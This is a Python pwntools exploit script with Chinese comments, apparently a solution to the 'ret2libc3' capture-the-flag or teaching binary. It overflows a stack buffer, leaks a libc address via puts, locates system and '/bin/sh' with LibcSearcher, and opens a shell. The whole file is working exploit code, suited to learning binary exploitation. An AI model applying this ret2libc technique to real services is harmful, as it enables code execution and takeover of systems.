#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher # 用于判断libc版本
context.log_level = "DEBUG"
sh = process("./ret2libc3")

ret2libc3 = ELF("./ret2libc3")
# pwnlib.elf.elf.ELF.plt: dotdict of name to address for all Procedure Linkate Table (PLT) entries
puts_plt = ret2libc3.plt["puts"] # puts 函数的 plt 表地址
# pwnlib.elf.elf.ELF.got: dotdict of name to address for all Global Offset Table (GOT) entries
libc_start_main_got = ret2libc3.got["__libc_start_main"] # __libc_start_main 函数的 got 表地址 # 0x804a024
main = ret2libc3.symbols["main"] # main函数的地址

print("leak libc_start_main_got addr and ret to main", str(hex(puts_plt)), str(hex(main)), str(hex(libc_start_main_got)))
# puts_plt, main, libc_start_main_got: 0x8048460 0x8048618 0x804a024
payload = flat(['A' * (108+4), puts_plt, main, libc_start_main_got]) # main函数RA与字符串s之间的偏移量为108+4，分析方法其他ROP相同
# 覆盖main函数返回地址为puts_plt，令puts_plt的RA为main，参数为libc_start_main_got # puts会输出 __libc_start_main 的got表地址
print("payload: ", payload.hex())
sh.sendlineafter("Can you find it !?", payload) # 收到 "Can you find it !?" 后发送payload

libc_start_main_addr = u32(sh.recv()[0:4]) # 接收前面payload输出的 libc_start_main_got
print("got libc_start_main_addr:", str(hex(libc_start_main_addr))) # got libc_start_main_addr: 0xf7de8d40
libc = LibcSearcher("__libc_start_main", libc_start_main_addr) # 用LibcSearcher库查找libc版本(可能不止一个)
libcbase = libc_start_main_addr - libc.dump("__libc_start_main") # 计算加载的libc的基址
print("loaded libc base addr:", str(hex(libcbase))) # loaded libc base addr: 0xf7dca000
system_addr = libcbase + libc.dump("system") # 计算 system 函数实际所在的地址
binsh_addr = libcbase + libc.dump("str_bin_sh") # 计算 str_bin_sh 字符串实际所在的地址
# 第二个payload，用于getshell
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr]) # 注意这里RA与字符串s之间的偏移量从前面的112变为104
sh.sendline(payload) # 覆盖RA为system_addr，执行system("/bin/sh")，system的RA为0xdeadbeef

sh.interactive()